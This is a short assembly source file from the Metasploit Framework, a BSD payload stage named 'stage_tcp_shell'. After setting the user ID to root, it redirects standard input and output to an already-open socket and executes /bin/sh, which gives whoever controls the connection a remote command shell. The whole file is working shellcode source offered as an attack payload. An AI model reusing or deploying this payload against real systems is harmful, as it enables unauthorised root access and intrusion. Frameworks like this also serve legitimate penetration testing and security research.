;;
;
;        Name: stage_tcp_shell
;        Type: Stage
;   Qualities: None
;   Platforms: BSD
;     Authors: skape <mmiller [at] hick.org>
;     Version: $Revision: 1606 $
;     License: 
;
;        This file is part of the Metasploit Exploit Framework
;        and is subject to the same licenses and copyrights as
;        the rest of this package.
;
; Description:
;
;        This payload redirects stdio to a file descriptor and executes
;        /bin/sh.
;
;;
BITS   32
GLOBAL main

%include "generic.asm"

main:
	setreuid     0
	execve_binsh EXECUTE_REDIRECT_IO
